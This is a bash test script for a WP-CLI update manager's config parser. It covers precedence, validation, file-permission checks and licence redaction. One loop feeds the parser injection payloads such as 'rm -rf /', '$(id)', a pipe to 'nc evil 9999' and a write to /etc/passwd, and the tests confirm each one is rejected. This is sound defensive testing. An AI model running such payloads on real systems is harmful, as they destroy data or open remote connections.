#!/usr/bin/env bash
# shellcheck shell=bash
# shellcheck disable=SC1091,SC2016
# Configuration layers, validation, and the permission model of the config file.
# The config file is parsed as data and never sourced; these checks are what
# proves that claim rather than merely documenting it.
set -uo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
repo="$(cd "$here/.." && pwd)"
WORK="${TEST_WORK:-$(mktemp -d "${TMPDIR:-/tmp}/wpcli-conf.XXXXXX")}"
chmod 755 "$WORK" 2>/dev/null
FAIL_FILE="${FAIL_FILE:-${WORK}/fail}"
PASS_FILE="${PASS_FILE:-${WORK}/pass}"
SKIP_FILE="${SKIP_FILE:-${WORK}/skip}"
export FAIL_FILE PASS_FILE SKIP_FILE
REPO="$repo"
export REPO
# shellcheck source=tests/harness.sh
. "${here}/harness.sh"
build_fixture
trap 'cleanup_work' EXIT

OUT="${WORK}/out.txt"
CONF="${WORK}/test.conf"

conf_run() { # extra args..., with --config $CONF and --print-config
    bash "$MANAGER" --color never --log-file '' --error-log-file '' \
        --lock-file "${WORK}/conf.lock" --config "$CONF" "$@" >"$OUT" 2>&1
}

say 'the file layer works and is attributed'
printf 'JOBS=4\nTIMEOUT=120\n' >"$CONF"
chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 0 ] && ok '--print-config with a config file exits 0' || bad '--print-config rc' "got $rc: $(head -n 3 "$OUT")"
grep -Eq '^JOBS +4 +pint +file:' "$OUT" && ok 'JOBS=4 from the file, attributed to the file' \
    || bad 'JOBS from file' "$(grep -E '^JOBS' "$OUT" | head -n 1)"
grep -Eq '^TIMEOUT +120 ' "$OUT" && ok 'TIMEOUT=120 from the file' \
    || bad 'TIMEOUT from file' "$(grep -E '^TIMEOUT' "$OUT" | head -n 1)"

say 'quoted and CR-terminated values'
printf 'JOBS="5"\r\nSTAGGER='"'"'2'"'"'\n' >"$CONF"
chmod 600 "$CONF"
conf_run --print-config
grep -Eq '^JOBS +5 ' "$OUT" && ok 'a double-quoted value with a CR is read as 5' \
    || bad 'double-quoted CR value' "$(grep -E '^JOBS' "$OUT" | head -n 1)"
grep -Eq '^STAGGER +2 ' "$OUT" && ok 'a single-quoted value is read as 2' \
    || bad 'single-quoted value' "$(grep -E '^STAGGER' "$OUT" | head -n 1)"

say 'precedence: file < environment < command line'
printf 'JOBS=4\n' >"$CONF"; chmod 600 "$CONF"
WP_CLI_UPDATE_JOBS=6 conf_run --print-config
grep -Eq '^JOBS +6 +pint +environment' "$OUT" && ok 'the environment beats the file' \
    || bad 'env over file' "$(grep -E '^JOBS' "$OUT" | head -n 1)"
WP_CLI_UPDATE_JOBS=6 conf_run --print-config --jobs 8
grep -Eq '^JOBS +8 +pint +command line +yes' "$OUT" && ok 'the command line beats the environment' \
    || bad 'cli over env' "$(grep -E '^JOBS' "$OUT" | head -n 1)"

say 'an unsafe config file is rejected wholesale, exit 4'
for payload in 'JOBS=4; rm -rf /' 'JOBS=$(id)' 'JOBS=`id`' 'JOBS=4 | nc evil 9999' 'JOBS=${HOME}' 'X=>/etc/passwd'; do
    printf '%s\n' "$payload" >"$CONF"; chmod 600 "$CONF"
    conf_run --print-config; rc=$?
    if [ "$rc" -eq 4 ]; then
        ok "rejected with exit 4: ${payload:0:28}"
    else
        bad "metacharacter config not rejected: ${payload:0:28}" "rc=$rc"
    fi
done
conf_run --print-config
expect_contains "$OUT" 'refusing to read this file' 'the refusal says why'

say 'unknown keys are ignored loudly, not executed'
# "Never sourced" is guaranteed by two mechanisms, both asserted: a line with a
# shell metacharacter rejects the whole file (previous section), and an unknown
# key is dropped with a warning. A line that passes both filters is a plain
# KEY=VALUE assignment into a whitelist, which cannot execute anything.
printf 'JOBS=3\nPWNED=1\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config
grep -Eq 'unknown setting' "$OUT" && ok 'an unknown key is reported and ignored' \
    || bad 'unknown key not reported' "$(head -n 5 "$OUT")"
grep -Eq '^JOBS +3 ' "$OUT" && ok 'the known key in the same file still applies' \
    || bad 'known key next to an unknown one' "$(grep -E '^JOBS' "$OUT" | head -n 1)"

say 'unknown keys get a suggestion when one is close'
printf 'SKIP_PLUGIN=foo\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config
expect_contains "$OUT" 'did you mean SKIP_PLUGINS' 'a near-miss key suggests the real one'

say 'a group- or world-writable config file is refused (root privilege model)'
printf 'JOBS=4\n' >"$CONF"
for m in 600 640 400 444; do
    chmod "$m" "$CONF"
    conf_run --print-config; rc=$?
    [ "$rc" -eq 0 ] && ok "mode ${m} is accepted" || bad "mode ${m} should be accepted" "rc=$rc"
done
for m in 664 666 622 620 777; do
    chmod "$m" "$CONF"
    conf_run --print-config; rc=$?
    if [ "$rc" -eq 4 ]; then
        ok "mode ${m} is refused with exit 4"
    else
        bad "mode ${m} must be refused" "rc=$rc"
    fi
done
chmod 600 "$CONF"
conf_run --print-config
expect_not_contains "$OUT" 'writable config' 'a 0600 file raises no permission warning'

say 'invalid values fail with the layer-appropriate exit code'
printf 'JOBS=abc\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 4 ] && ok 'a bad value in the file exits 4 (configuration error)' \
    || bad 'bad file value exit code' "got $rc, want 4"
expect_contains "$OUT" 'positive integer' 'the message names the rule'

WP_CLI_UPDATE_JOBS=abc bash "$MANAGER" --color never --log-file '' --error-log-file '' \
    --lock-file "${WORK}/conf.lock" --print-config >"$OUT" 2>&1; rc=$?
[ "$rc" -eq 3 ] && ok 'a bad value in the environment exits 3 (environment error)' \
    || bad 'bad env value exit code' "got $rc, want 3"

bash "$MANAGER" --color never --log-file '' --error-log-file '' \
    --lock-file "${WORK}/conf.lock" --print-config --jobs abc >"$OUT" 2>&1; rc=$?
[ "$rc" -eq 2 ] && ok 'a bad value on the command line exits 2 (usage error)' \
    || bad 'bad cli value exit code' "got $rc, want 2"

say 'choice validation covers the new settings'
for kv in 'MULTISITE=sometimes' 'NOTIFY_ON=sometimes' 'WP_CLI_UPDATE_CHANNEL=beta' \
          'WP_CLI_UPDATE_SCOPE=huge' 'CACHE_TRANSIENTS=maybe' 'SMOKE_ON_FAIL=scream' \
          'LICENCE_HANDOFF=telepathy' 'LOG_FORMAT=yaml'; do
    printf '%s\n' "$kv" >"$CONF"; chmod 600 "$CONF"
    conf_run --print-config; rc=$?
    [ "$rc" -eq 4 ] && ok "rejected: ${kv}" || bad "should be rejected: ${kv}" "rc=$rc"
done

say 'USER_ENV accepts names only, never values'
printf 'USER_ENV=HTTP_PROXY https_proxy\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 0 ] && ok 'a list of variable names is accepted' || bad 'USER_ENV names' "rc=$rc"
printf 'USER_ENV=HTTP_PROXY=secret\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 4 ] && ok 'a value inside USER_ENV is rejected' || bad 'USER_ENV with a value' "rc=$rc"

say 'CACHE_EXTRA accepts command tokens only'
printf 'CACHE_EXTRA=litespeed-purge-all rocket-clean\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 0 ] && ok 'plain wp subcommand tokens are accepted' || bad 'CACHE_EXTRA tokens' "rc=$rc"
printf 'CACHE_EXTRA=flush;reboot\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 4 ] && ok 'a shell metacharacter in CACHE_EXTRA is rejected' || bad 'CACHE_EXTRA metacharacter' "rc=$rc"

say 'relative paths are refused for the path-typed settings'
printf 'LOG_FILE=logs/manager.log\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config; rc=$?
[ "$rc" -eq 4 ] && ok 'a relative LOG_FILE is rejected' || bad 'relative LOG_FILE' "rc=$rc"

say 'the licence never appears in --print-config output'
printf 'LICENCE=SUPER-SECRET-KEY-12345\n' >"$CONF"; chmod 600 "$CONF"
conf_run --print-config
expect_not_contains "$OUT" 'SUPER-SECRET-KEY-12345' 'the value is redacted'
expect_contains "$OUT" 'redacted' 'the table says the value is redacted'

say 'a placeholder licence is refused, not activated'
printf 'LICENCE=YOUR_KEY_HERE\nASTRA_SLUG=astra-addon\n' >"$CONF"; chmod 600 "$CONF"
argv_log_reset
bash "$MANAGER" --color never --log-file "$LOG_FILE" --error-log-file "$ERR_FILE" \
    --lock-file "${WORK}/conf.lock" --wp "$STUB_WP" --sites "$SITE_LIST" \
    --user-env FAKE_WP_LOG --config "$CONF" --astra >"$OUT" 2>&1
rc=$?
[ "$rc" -ne 0 ] && ok 'a placeholder licence fails --astra instead of activating it' \
    || bad 'placeholder licence accepted' "rc=$rc"
expect_contains "$OUT" 'needs a licence' 'the error explains where a licence can come from'

say 'a licence key file is found via HOME and never logged'
printf 'TOPSECRET-KEYFILE-VALUE\n' >"${WORK}/.astra.key"
chmod 600 "${WORK}/.astra.key"
printf '' >"$CONF"; chmod 600 "$CONF"
argv_log_reset
: >"$LOG_FILE"
HOME="$WORK" ASTRA_FAIL_SLUG=astra-addon FAKE_WP_LOG="$ARGV_LOG" \
    bash "$MANAGER" --color never --log-file "$LOG_FILE" --error-log-file "$ERR_FILE" \
    --lock-file "${WORK}/conf.lock" --wp "$STUB_WP" --sites "$SITE_LIST" \
    --user-env FAKE_WP_LOG --astra >"$OUT" 2>&1
rc=$?
if grep -q 'LICENCE=<set' "$ARGV_LOG" 2>/dev/null; then
    ok 'the licence reached the child process through the handoff'
else
    bad 'the licence did not reach the child' "stub log: $(head -n 2 "$ARGV_LOG" 2>/dev/null)"
fi
if grep -Fq 'TOPSECRET-KEYFILE-VALUE' "$LOG_FILE" "$ERR_FILE" "$OUT" 2>/dev/null; then
    bad 'the licence value leaked into a log or the console' ''
else
    ok 'the licence value appears in no log and on no console'
fi
[ "$rc" -ne 0 ] && ok '--astra with a failing update exits non-zero' || bad '--astra exit code' "got $rc"

say 'LICENCE_HANDOFF=file also works and leaves no file behind'
printf 'LICENCE_HANDOFF=file\nLICENCE=ANOTHER-SECRET-VALUE-9\n' >"$CONF"; chmod 600 "$CONF"
argv_log_reset
: >"$LOG_FILE"
ASTRA_FAIL_SLUG=astra-addon FAKE_WP_LOG="$ARGV_LOG" \
    bash "$MANAGER" --color never --log-file "$LOG_FILE" --error-log-file "$ERR_FILE" \
    --lock-file "${WORK}/conf.lock" --wp "$STUB_WP" --sites "$SITE_LIST" \
    --user-env FAKE_WP_LOG --config "$CONF" --astra >"$OUT" 2>&1
if grep -q 'LICENCE=<set' "$ARGV_LOG" 2>/dev/null; then
    ok 'the file handoff delivered the licence'
else
    bad 'the file handoff did not deliver' "$(head -n 2 "$ARGV_LOG" 2>/dev/null)"
fi
if grep -Fq 'ANOTHER-SECRET-VALUE-9' "$LOG_FILE" "$OUT" 2>/dev/null; then
    bad 'the file-handoff licence leaked into the log' ''
else
    ok 'the file-handoff licence stayed out of the log'
fi
leaked=0
for f in "${TMPDIR:-/tmp}"/Bash_WP-CLI_Update.sh.licence.*; do
    [ -e "$f" ] && leaked=$((leaked + 1))
done
[ "$leaked" -eq 0 ] && ok 'no licence handoff file survived the run' \
    || bad 'licence handoff files leaked' "$leaked file(s)"

report test_config
